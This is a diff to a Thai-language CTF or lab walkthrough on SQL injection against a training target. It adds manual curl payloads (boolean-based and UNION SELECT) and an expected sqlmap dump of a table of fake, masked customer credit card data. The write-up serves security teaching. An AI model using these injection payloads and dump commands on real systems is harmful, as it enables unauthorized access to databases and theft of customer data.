@@ -558,6 +558,20 @@ Flag: SMC{un10n_2_4dm1n_p4n3l}
 ### เครื่องมือที่ต้องใช้
 - Kali Linux หรือเครื่องที่มี sqlmap
 
+### Manual SQLi Verification (Optional)
+
+ก่อนใช้ sqlmap สามารถทดสอบ SQLi ด้วยมือได้:
+
+```bash
+# Boolean-based: ผลลัพธ์ต่างกัน
+curl "http://10.10.61.87/lab06?id=1 AND 1=1"  # แสดงสินค้า
+curl "http://10.10.61.87/lab06?id=1 AND 1=2"  # ไม่แสดงสินค้า
+
+# Union-based: ดึง DB version (categories table มี 2 columns)
+curl "http://10.10.61.87/lab06?id=0 UNION SELECT 1,version()--"
+# Title จะแสดง: PostgreSQL 16.x
+```
+
 ### Walkthrough
 
 #### Step 1: ตรวจจับ SQL Injection
@@ -591,7 +605,18 @@ sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart --tables --batch
 sqlmap -u "http://10.10.61.87/lab06?id=1" -D thaimart -T secret_orders --dump --batch
 ```
 
-**ผลลัพธ์:** ข้อมูล orders ลับพร้อมเลขบัตรเครดิต (fake)
+**ผลลัพธ์ที่ควรเห็น:**
+```
++----+---------------+---------------------+----------+
+| id | customer_name | card_number         | amount   |
++----+---------------+---------------------+----------+
+| 1  | สมชาย ใจดี     | 4532-XXXX-XXXX-1234 | 15900.00 |
+| 2  | มาลี สุขสันต์     | 5412-XXXX-XXXX-5678 | 8900.00  |
+| 3  | วิชัย มั่งมี       | 4916-XXXX-XXXX-9012 | 42900.00 |
++----+---------------+---------------------+----------+
+```
+
+💡 **พบข้อมูลบัตรเครดิตลูกค้า!** (fake data สำหรับการเรียนรู้)
 
 ### Options ที่มีประโยชน์
 ```bash
